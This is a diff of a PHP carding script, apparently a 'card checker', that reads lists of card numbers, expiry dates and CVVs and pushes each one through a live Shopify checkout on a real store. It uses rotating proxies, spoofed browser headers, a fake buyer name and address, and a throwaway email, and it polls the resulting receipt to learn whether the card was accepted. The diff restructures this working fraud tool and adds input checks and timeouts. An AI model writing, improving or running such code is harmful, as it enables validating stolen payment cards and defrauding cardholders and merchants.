@@ -255,484 +255,206 @@ foreach ($cc_lines as $cc_line) {
     $cc1 = trim($cc_line);
 
     if (empty($cc1)) {
-        echo json_encode([
-            'Error' => 'True',
-            'Message' => 'Please enter card details',
-            'Owner' => '⚡⚡ @mhitzxg ⚡⚡',
-        ]);
-        echo str_repeat(' ', 1024);
-        flush();
         continue;
     }
 
     $cc_partes = explode("|", $cc1);
-    $cc = $cc_partes[0];
-    $month = $cc_partes[1];
-    $year = $cc_partes[2];
-    $cvv = $cc_partes[3];
+    if (count($cc_partes) < 4) {
+        $err = "Invalid card format";
+        $status = "❌ INVALID FORMAT";
+        $cc = $cc1;
+        $sub_month = "XX";
+        $year = "XXXX";
+        $cvv = "XXX";
+    } else {
+        $cc = $cc_partes[0];
+        $month = $cc_partes[1];
+        $year = $cc_partes[2];
+        $cvv = $cc_partes[3];
 
-    /*=====  sub_month  ======*/
-    $yearcont = strlen($year);
-    if ($yearcont <= 2) {
-        $year = "20$year";
-    }
+        /*=====  sub_month  ======*/
+        $yearcont = strlen($year);
+        if ($yearcont <= 2) {
+            $year = "20$year";
+        }
 
-    $sub_month = ltrim($month, '0');
+        $sub_month = ltrim($month, '0');
 
-    if ($sub_month == "") {
-        $sub_month = $month;
-    }
+        if ($sub_month == "") {
+            $sub_month = $month;
+        }
 
-    // The variables that may be uninitialized
-    $err = '';
-    $response = '';
-    $checkouturl = '';
-    $headers = [];
-    $x_checkout_one_session_token = '';
-    $queue_token = '';
-    $stable_id = '';
-    $paymentMethodIdentifier = '';
-    $cctoken = '';
-    $recipt_id = '';
-
-    $urlbase = 'https://blackmp.life/';
-    $domain = 'blackmp.life';
-    $cookie = 'cookie.txt';
-    
-    $proxy = $proxy_array[array_rand($proxy_array)];
-
-    // Start of try-catch to handle exceptions
-    try {
-        // First cURL request
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/42721297924198:2');
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
-        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
-        curl_setopt($ch, CURLOPT_HEADER, true);
-        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-        curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language: en-US,en;q=0.9',
-            'priority: u=0, i',
-            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-            'sec-ch-ua-mobile: ?0',
-            'sec-ch-ua-platform: "Windows"',
-            'sec-fetch-dest: document',
-            'sec-fetch-mode: navigate',
-            'sec-fetch-site: none',
-            'sec-fetch-user: ?1',
-            'upgrade-insecure-requests: 1',
-            'user-agent: '.$ua,
-        ]);
-        
-        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
-        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
-        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-
+        // The variables that may be uninitialized
+        $err = '';
+        $response = '';
+        $checkouturl = '';
         $headers = [];
-        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
-            $parts = explode(':', $headerLine, 2);
-            if (count($parts) < 2) return strlen($headerLine);
-            $name = trim($parts[0]);
-            $value = trim($parts[1]);
+        $x_checkout_one_session_token = '';
+        $queue_token = '';
+        $stable_id = '';
+        $paymentMethodIdentifier = '';
+        $cctoken = '';
+        $recipt_id = '';
 
-            if (strtolower($name) === 'location') {
-                $headers['Location'] = $value;
+        $urlbase = 'https://blackmp.life/';
+        $domain = 'blackmp.life';
+        $cookie = 'cookie.txt';
+        
+        $proxy = $proxy_array[array_rand($proxy_array)];
+
+        // Start of try-catch to handle exceptions
+        try {
+            // First cURL request
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/42721297924198:2');
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+            curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+            curl_setopt($ch, CURLOPT_HEADER, true);
+            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+            curl_setopt($ch, CURLOPT_HTTPHEADER, [
+                'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language: en-US,en;q=0.9',
+                'priority: u=0, i',
+                'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+                'sec-ch-ua-mobile: ?0',
+                'sec-ch-ua-platform: "Windows"',
+                'sec-fetch-dest: document',
+                'sec-fetch-mode: navigate',
+                'sec-fetch-site: none',
+                'sec-fetch-user: ?1',
+                'upgrade-insecure-requests: 1',
+                'user-agent: '.$ua,
+            ]);
+            
+            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
+            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
+            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+
+            $headers = [];
+            curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
+                $parts = explode(':', $headerLine, 2);
+                if (count($parts) < 2) return strlen($headerLine);
+                $name = trim($parts[0]);
+                $value = trim($parts[1]);
+
+                if (strtolower($name) === 'location') {
+                    $headers['Location'] = $value;
+                }
+
+                return strlen($headerLine);
+            });
+            
+            $response = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            
+            if (curl_errno($ch)) {
+                $err = 'cURL error: ' . curl_error($ch);
+                curl_close($ch);
+                throw new Exception($err);
+            }
+            
+            if ($http_code != 200 && $http_code != 302) {
+                $err = "HTTP Error: $http_code";
+                curl_close($ch);
+                throw new Exception($err);
+            }
+            
+            if (preg_match('/out of stock/i', $response)) {
+                $err = 'Product is out of stock';
+                curl_close($ch);
+                throw new Exception($err);
+            }
+            curl_close($ch);
+
+            $checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
+            $checkoutToken = '';
+            if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
+                $checkoutToken = $matches[1];
+            }
+            
+            $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
+            if (empty($x_checkout_one_session_token)) {
+                $x_checkout_one_session_token = find_between($response, 'sessionToken&quot;:&quot;', '&quot;');
+            }
+            
+            if (empty($x_checkout_one_session_token)) {
+                $err = "Session token is empty - Check if site is accessible";
+                throw new Exception($err);
+            }
+            
+            $queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
+            if (empty($queue_token)) {
+                $err = 'Queue Token is empty';
+                throw new Exception($err);
+            }
+            
+            $stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
+            if (empty($stable_id)) {
+                $err = 'Stable id is empty';
+                throw new Exception($err);
+            }
+            
+            $paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
+            if (empty($paymentMethodIdentifier)) {
+                $err = 'Payment Method Identifier Token is empty';
+                throw new Exception($err);
             }
 
-            return strlen($headerLine);
-        });
-        
-        $response = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        
-        if (curl_errno($ch)) {
-            $err = 'cURL error: ' . curl_error($ch);
-            curl_close($ch);
-            throw new Exception($err);
-        }
-        
-        if ($http_code != 200 && $http_code != 302) {
-            $err = "HTTP Error: $http_code";
-            curl_close($ch);
-            throw new Exception($err);
-        }
-        
-        if (preg_match('/out of stock/i', $response)) {
-            $err = 'Product is out of stock';
-            curl_close($ch);
-            throw new Exception($err);
-        }
-        curl_close($ch);
-
-        $checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
-        $checkoutToken = '';
-        if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
-            $checkoutToken = $matches[1];
-        }
-        
-        $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
-        if (empty($x_checkout_one_session_token)) {
-            $x_checkout_one_session_token = find_between($response, 'sessionToken&quot;:&quot;', '&quot;');
-        }
-        
-        if (empty($x_checkout_one_session_token)) {
-            $err = "Session token is empty - Check if site is accessible";
-            throw new Exception($err);
-        }
-        
-        $queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
-        if (empty($queue_token)) {
-            $err = 'Queue Token is empty';
-            throw new Exception($err);
-        }
-        
-        $stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
-        if (empty($stable_id)) {
-            $err = 'Stable id is empty';
-            throw new Exception($err);
-        }
-        
-        $paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
-        if (empty($paymentMethodIdentifier)) {
-            $err = 'Payment Method Identifier Token is empty';
-            throw new Exception($err);
-        }
-
-        // Second cURL request (card)
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-        curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            'accept: application/json',
-            'accept-language: en-US,en;q=0.9',
-            'content-type: application/json',
-            'origin: https://checkout.shopifycs.com',
-            'priority: u=1, i',
-            'referer: https://checkout.shopifycs.com/',
-            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-            'sec-ch-ua-mobile: ?0',
-            'sec-ch-ua-platform: "Windows"',
-            'sec-fetch-dest: empty',
-            'sec-fetch-mode: cors',
-            'sec-fetch-site: same-site',
-            'user-agent: '.$ua,
-        ]);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"insane xd"},"payment_session_scope":"'.$domain.'"}');
-        
-        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
-        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
-        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-        
-        $response2 = curl_exec($ch);
-        $http_code2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        
-        if (curl_errno($ch)) {
-            $err = 'cURL error: ' . curl_error($ch);
-            curl_close($ch);
-            throw new Exception($err);
-        }
-        
-        $response2js = json_decode($response2, true);
-        $cctoken = $response2js['id'] ?? '';
-        
-        if (empty($cctoken)) {
-            $error_msg = $response2js['message'] ?? 'Unknown error in card tokenization';
-            $err  = 'Card Token failed: ' . $error_msg;
-            curl_close($ch);
-            throw new Exception($err);
-        }
-        curl_close($ch);
-
-        // Third cURL request (receipt)
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-        curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            'accept: application/json',
-            'accept-language: en-US',
-            'content-type: application/json',
-            'origin: '.$urlbase,
-            'priority: u=1, i',
-            'referer: '.$urlbase.'/',
-            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-            'sec-ch-ua-mobile: ?0',
-            'sec-ch-ua-platform: "Windows"',
-            'sec-fetch-dest: empty',
-            'sec-fetch-mode: cors',
-            'sec-fetch-site: same-origin',
-            'user-agent: '.$ua,
-            'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
-            'x-checkout-web-deploy-stage: production',
-            'x-checkout-web-server-handling: fast',
-            'x-checkout-web-server-rendering: no',
-            'x-checkout-web-source-id: ' . $checkoutToken,
-        ]);
-
-        $postf = json_encode([
-            'query' => 'mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
-                submitForCompletion(input: $input, attemptToken: $attemptToken) {
-                    ...on SubmitSuccess {
-                        receipt {
-                            ...on ProcessedReceipt {
-                                id
-                                token
-                                redirectUrl
-                            }
-                            ...on ProcessingReceipt {
-                                id
-                                pollDelay
-                            }
-                            ...on FailedReceipt {
-                                id
-                                processingError {
-                                    ...on PaymentFailed {
-                                        code
-                                        messageUntranslated
-                                    }
-                                }
-                            }
-                        }
-                    }
-                    ...on SubmitFailed {
-                        reason
-                    }
-                    ...on SubmitRejected {
-                        errors {
-                            code
-                            localizedMessage
-                        }
-                    }
-                }
-            }',
-            'variables' => [
-                'input' => [
-                    'sessionInput' => [
-                        'sessionToken' => $x_checkout_one_session_token
-                    ],
-                    'queueToken' => $queue_token,
-                    'discounts' => [
-                        'lines' => [],
-                        'acceptUnexpectedDiscounts' => true
-                    ],
-                    'delivery' => [
-                        'deliveryLines' => [
-                            [
-                                'destination' => [
-                                    'streetAddress' => [
-                                        'address1' => '4th Street Venue',
-                                        'city' => 'New york',
-                                        'countryCode' => 'US',
-                                        'postalCode' => '10080',
-                                        'firstName' => 'yashi Kumbi',
-                                        'lastName' => 'Hasi',
-                                        'zoneCode' => 'NY',
-                                        'phone' => '',
-                                        'oneTimeUse' => false
-                                    ]
-                                ],
-                                'selectedDeliveryStrategy' => [
-                                    'deliveryStrategyByHandle' => [
-                                        'handle' => 'eedd39a6a58d3e7832641de01fda4ff4-76541393eff3a16bf34c87eae9303e6b',
-                                        'customDeliveryRate' => false
-                                    ]
-                                ],
-                                'targetMerchandiseLines' => [
-                                    'lines' => [
-                                        [
-                                            'stableId' => $stable_id,
-                                        ]
-                                    ]
-                                ],
-                                'deliveryMethodTypes' => [
-                                    'SHIPPING'
-                                ],
-                                'expectedTotalPrice' => [
-                                    'value' => [
-                                        'amount' => '5.99',
-                                        'currencyCode' => 'USD'
-                                    ]
-                                ],
-                                'destinationChanged' => false
-                            ]
-                        ],
-                        'noDeliveryRequired' => [],
-                        'useProgressiveRates' => false,
-                        'prefetchShippingRatesStrategy' => null,
-                        'supportsSplitShipping' => true
-                    ],
-                    'merchandise' => [
-                        'merchandiseLines' => [
-                            [
-                                'stableId' => $stable_id,
-                                'merchandise' => [
-                                    'productVariantReference' => [
-                                        'id' => 'gid://shopify/ProductVariantMerchandise/42721297924198',
-                                        'variantId' => 'gid://shopify/ProductVariant/42721297924198',
-                                        'properties' => [],
-                                        'sellingPlanId' => null,
-                                        'sellingPlanDigest' => null
-                                    ]
-                                ],
-                                'quantity' => [
-                                    'items' => [
-                                        'value' => 2
-                                    ]
-                                ],
-                                'expectedTotalPrice' => [
-                                    'value' => [
-                                        'amount' => '15.98',
-                                        'currencyCode' => 'USD'
-                                    ]
-                                ],
-                                'lineComponentsSource' => null,
-                                'lineComponents' => []
-                            ]
-                        ]
-                    ],
-                    'memberships' => [
-                        'memberships' => []
-                    ],
-                    'payment' => [
-                        'totalAmount' => [
-                            'any' => true
-                        ],
-                        'paymentLines' => [
-                            [
-                                'paymentMethod' => [
-                                    'directPaymentMethod' => [
-                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
-                                        'sessionId' => $cctoken,
-                                        'billingAddress' => [
-                                            'streetAddress' => [
-                                                'address1' => '4th Street Venue',
-                                                'city' => 'New york',
-                                                'countryCode' => 'US',
-                                                'postalCode' => '10080',
-                                                'firstName' => 'yashi Kumbi',
-                                                'lastName' => 'Hasi',
-                                                'zoneCode' => 'NY',
-                                                'phone' => ''
-                                            ]
-                                        ]
-                                    ]
-                                ],
-                                'amount' => [
-                                    'value' => [
-                                        'amount' => '21.97',
-                                        'currencyCode' => 'USD'
-                                    ]
-                                ]
-                            ]
-                        ],
-                        'billingAddress' => [
-                            'streetAddress' => [
-                                'address1' => '4th Street Venue',
-                                'city' => 'New york',
-                                'countryCode' => 'US',
-                                'postalCode' => '10080',
-                                'firstName' => 'yashi Kumbi',
-                                'lastName' => 'Hasi',
-                                'zoneCode' => 'NY',
-                                'phone' => ''
-                            ]
-                        ]
-                    ],
-                    'buyerIdentity' => [
-                        'customer' => [
-                            'presentmentCurrency' => 'USD',
-                            'countryCode' => 'US'
-                        ],
-                        'email' => 'proxybroproxy@gmail.com',
-                        'emailChanged' => false,
-                        'phoneCountryCode' => 'US',
-                        'marketingConsent' => [],
-                        'shopPayOptInPhone' => [
-                            'countryCode' => 'US'
-                        ],
-                        'rememberMe' => false
-                    ],
-                    'tip' => [
-                        'tipLines' => []
-                    ],
-                    'taxes' => [
-                        'proposedAllocations' => null,
-                        'proposedTotalAmount' => [
-                            'value' => [
-                                'amount' => '0',
-                                'currencyCode' => 'USD'
-                            ]
-                        ],
-                        'proposedTotalIncludedAmount' => null,
-                        'proposedMixedStateTotalAmount' => null,
-                        'proposedExemptions' => []
-                    ],
-                    'note' => [
-                        'message' => null,
-                        'customAttributes' => []
-                    ],
-                    'localizationExtension' => [
-                        'fields' => []
-                    ],
-                    'nonNegotiableTerms' => null,
-                    'scriptFingerprint' => [
-                        'signature' => null,
-                        'signatureUuid' => null,
-                        'lineItemScriptChanges' => [],
-                        'paymentScriptChanges' => [],
-                        'shippingScriptChanges' => []
-                    ],
-                    'optionalDuties' => [
-                        'buyerRefusesDuties' => false
-                    ],
-                    'cartMetafields' => []
-                ],
-                'attemptToken' => $checkoutToken . '8ix3lway4kj',
-                'metafields' => [],
-                'analytics' => [
-                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
-                    'pageId' => 'b2b0b81e-D05D-47C0-F64C-18D9467EA842'
-                ]
-            ],
-            'operationName' => 'SubmitForCompletion'
-        ]);
-
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);
-        
-        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
-        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
-        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-
-        $response4 = curl_exec($ch);
-        $http_code4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-
-        $response4js = json_decode($response4);
-        curl_close($ch);
-
-        // FIXED: Correct GraphQL query for PollForReceipt
-        $pollQuery = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token redirectUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}}}';
-
-        if (isset($response4js->data->submitForCompletion->receipt->id)) {
-            $recipt_id = $response4js->data->submitForCompletion->receipt->id;
-            
-            // Fourth request - Poll for receipt status with CORRECT query
-            $postf2 = json_encode([
-                'query' => $pollQuery,
-                'variables' => [
-                    'receiptId' => $recipt_id,
-                    'sessionToken' => $x_checkout_one_session_token
-                ],
-                'operationName' => 'PollForReceipt'
-            ]);
-
+            // Second cURL request (card)
             $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
+            curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+            curl_setopt($ch, CURLOPT_HTTPHEADER, [
+                'accept: application/json',
+                'accept-language: en-US,en;q=0.9',
+                'content-type: application/json',
+                'origin: https://checkout.shopifycs.com',
+                'priority: u=1, i',
+                'referer: https://checkout.shopifycs.com/',
+                'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+                'sec-ch-ua-mobile: ?0',
+                'sec-ch-ua-platform: "Windows"',
+                'sec-fetch-dest: empty',
+                'sec-fetch-mode: cors',
+                'sec-fetch-site: same-site',
+                'user-agent: '.$ua,
+            ]);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"insane xd"},"payment_session_scope":"'.$domain.'"}');
+            
+            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
+            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
+            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+            
+            $response2 = curl_exec($ch);
+            $http_code2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            
+            if (curl_errno($ch)) {
+                $err = 'cURL error: ' . curl_error($ch);
+                curl_close($ch);
+                throw new Exception($err);
+            }
+            
+            $response2js = json_decode($response2, true);
+            $cctoken = $response2js['id'] ?? '';
+            
+            if (empty($cctoken)) {
+                $error_msg = $response2js['message'] ?? 'Unknown error in card tokenization';
+                $err  = 'Card Token failed: ' . $error_msg;
+                curl_close($ch);
+                throw new Exception($err);
+            }
+            curl_close($ch);
+
+            // Third cURL request (receipt)
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
             curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
             curl_setopt($ch, CURLOPT_HTTPHEADER, [
@@ -741,7 +463,7 @@ foreach ($cc_lines as $cc_line) {
                 'content-type: application/json',
                 'origin: '.$urlbase,
                 'priority: u=1, i',
-                'referer: '.$urlbase,
+                'referer: '.$urlbase.'/',
                 'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                 'sec-ch-ua-mobile: ?0',
                 'sec-ch-ua-platform: "Windows"',
@@ -750,68 +472,398 @@ foreach ($cc_lines as $cc_line) {
                 'sec-fetch-site: same-origin',
                 'user-agent: '.$ua,
                 'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
-                'x-checkout-web-build-id: 63e3454a054ed16691c8d7d3dfaf57981df0b7df',
                 'x-checkout-web-deploy-stage: production',
                 'x-checkout-web-server-handling: fast',
                 'x-checkout-web-server-rendering: no',
                 'x-checkout-web-source-id: ' . $checkoutToken,
             ]);
 
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
+            $postf = json_encode([
+                'query' => 'mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
+                    submitForCompletion(input: $input, attemptToken: $attemptToken) {
+                        ...on SubmitSuccess {
+                            receipt {
+                                ...on ProcessedReceipt {
+                                    id
+                                    token
+                                    redirectUrl
+                                }
+                                ...on ProcessingReceipt {
+                                    id
+                                    pollDelay
+                                }
+                                ...on FailedReceipt {
+                                    id
+                                    processingError {
+                                        ...on PaymentFailed {
+                                            code
+                                            messageUntranslated
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        ...on SubmitFailed {
+                            reason
+                        }
+                        ...on SubmitRejected {
+                            errors {
+                                code
+                                localizedMessage
+                            }
+                        }
+                    }
+                }',
+                'variables' => [
+                    'input' => [
+                        'sessionInput' => [
+                            'sessionToken' => $x_checkout_one_session_token
+                        ],
+                        'queueToken' => $queue_token,
+                        'discounts' => [
+                            'lines' => [],
+                            'acceptUnexpectedDiscounts' => true
+                        ],
+                        'delivery' => [
+                            'deliveryLines' => [
+                                [
+                                    'destination' => [
+                                        'streetAddress' => [
+                                            'address1' => '4th Street Venue',
+                                            'city' => 'New york',
+                                            'countryCode' => 'US',
+                                            'postalCode' => '10080',
+                                            'firstName' => 'yashi Kumbi',
+                                            'lastName' => 'Hasi',
+                                            'zoneCode' => 'NY',
+                                            'phone' => '',
+                                            'oneTimeUse' => false
+                                        ]
+                                    ],
+                                    'selectedDeliveryStrategy' => [
+                                        'deliveryStrategyByHandle' => [
+                                            'handle' => 'eedd39a6a58d3e7832641de01fda4ff4-76541393eff3a16bf34c87eae9303e6b',
+                                            'customDeliveryRate' => false
+                                        ]
+                                    ],
+                                    'targetMerchandiseLines' => [
+                                        'lines' => [
+                                            [
+                                                'stableId' => $stable_id,
+                                            ]
+                                        ]
+                                    ],
+                                    'deliveryMethodTypes' => [
+                                        'SHIPPING'
+                                    ],
+                                    'expectedTotalPrice' => [
+                                        'value' => [
+                                            'amount' => '5.99',
+                                            'currencyCode' => 'USD'
+                                        ]
+                                    ],
+                                    'destinationChanged' => false
+                                ]
+                            ],
+                            'noDeliveryRequired' => [],
+                            'useProgressiveRates' => false,
+                            'prefetchShippingRatesStrategy' => null,
+                            'supportsSplitShipping' => true
+                        ],
+                        'merchandise' => [
+                            'merchandiseLines' => [
+                                [
+                                    'stableId' => $stable_id,
+                                    'merchandise' => [
+                                        'productVariantReference' => [
+                                            'id' => 'gid://shopify/ProductVariantMerchandise/42721297924198',
+                                            'variantId' => 'gid://shopify/ProductVariant/42721297924198',
+                                            'properties' => [],
+                                            'sellingPlanId' => null,
+                                            'sellingPlanDigest' => null
+                                        ]
+                                    ],
+                                    'quantity' => [
+                                        'items' => [
+                                            'value' => 2
+                                        ]
+                                    ],
+                                    'expectedTotalPrice' => [
+                                        'value' => [
+                                            'amount' => '15.98',
+                                            'currencyCode' => 'USD'
+                                        ]
+                                    ],
+                                    'lineComponentsSource' => null,
+                                    'lineComponents' => []
+                                ]
+                            ]
+                        ],
+                        'memberships' => [
+                            'memberships' => []
+                        ],
+                        'payment' => [
+                            'totalAmount' => [
+                                'any' => true
+                            ],
+                            'paymentLines' => [
+                                [
+                                    'paymentMethod' => [
+                                        'directPaymentMethod' => [
+                                            'paymentMethodIdentifier' => $paymentMethodIdentifier,
+                                            'sessionId' => $cctoken,
+                                            'billingAddress' => [
+                                                'streetAddress' => [
+                                                    'address1' => '4th Street Venue',
+                                                    'city' => 'New york',
+                                                    'countryCode' => 'US',
+                                                    'postalCode' => '10080',
+                                                    'firstName' => 'yashi Kumbi',
+                                                    'lastName' => 'Hasi',
+                                                    'zoneCode' => 'NY',
+                                                    'phone' => ''
+                                                ]
+                                            ]
+                                        ]
+                                    ],
+                                    'amount' => [
+                                        'value' => [
+                                            'amount' => '21.97',
+                                            'currencyCode' => 'USD'
+                                        ]
+                                    ]
+                                ]
+                            ],
+                            'billingAddress' => [
+                                'streetAddress' => [
+                                    'address1' => '4th Street Venue',
+                                    'city' => 'New york',
+                                    'countryCode' => 'US',
+                                    'postalCode' => '10080',
+                                    'firstName' => 'yashi Kumbi',
+                                    'lastName' => 'Hasi',
+                                    'zoneCode' => 'NY',
+                                    'phone' => ''
+                                ]
+                            ]
+                        ],
+                        'buyerIdentity' => [
+                            'customer' => [
+                                'presentmentCurrency' => 'USD',
+                                'countryCode' => 'US'
+                            ],
+                            'email' => 'proxybroproxy@gmail.com',
+                            'emailChanged' => false,
+                            'phoneCountryCode' => 'US',
+                            'marketingConsent' => [],
+                            'shopPayOptInPhone' => [
+                                'countryCode' => 'US'
+                            ],
+                            'rememberMe' => false
+                        ],
+                        'tip' => [
+                            'tipLines' => []
+                        ],
+                        'taxes' => [
+                            'proposedAllocations' => null,
+                            'proposedTotalAmount' => [
+                                'value' => [
+                                    'amount' => '0',
+                                    'currencyCode' => 'USD'
+                                ]
+                            ],
+                            'proposedTotalIncludedAmount' => null,
+                            'proposedMixedStateTotalAmount' => null,
+                            'proposedExemptions' => []
+                        ],
+                        'note' => [
+                            'message' => null,
+                            'customAttributes' => []
+                        ],
+                        'localizationExtension' => [
+                            'fields' => []
+                        ],
+                        'nonNegotiableTerms' => null,
+                        'scriptFingerprint' => [
+                            'signature' => null,
+                            'signatureUuid' => null,
+                            'lineItemScriptChanges' => [],
+                            'paymentScriptChanges' => [],
+                            'shippingScriptChanges' => []
+                        ],
+                        'optionalDuties' => [
+                            'buyerRefusesDuties' => false
+                        ],
+                        'cartMetafields' => []
+                    ],
+                    'attemptToken' => $checkoutToken . '8ix3lway4kj',
+                    'metafields' => [],
+                    'analytics' => [
+                        'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
+                        'pageId' => 'b2b0b81e-D05D-47C0-F64C-18D9467EA842'
+                    ]
+                ],
+                'operationName' => 'SubmitForCompletion'
+            ]);
 
-            $response5 = curl_exec($ch);
-            $http_code5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);
+            
+            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
+            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
+            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+
+            $response4 = curl_exec($ch);
+            $http_code4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+            $response4js = json_decode($response4);
             curl_close($ch);
 
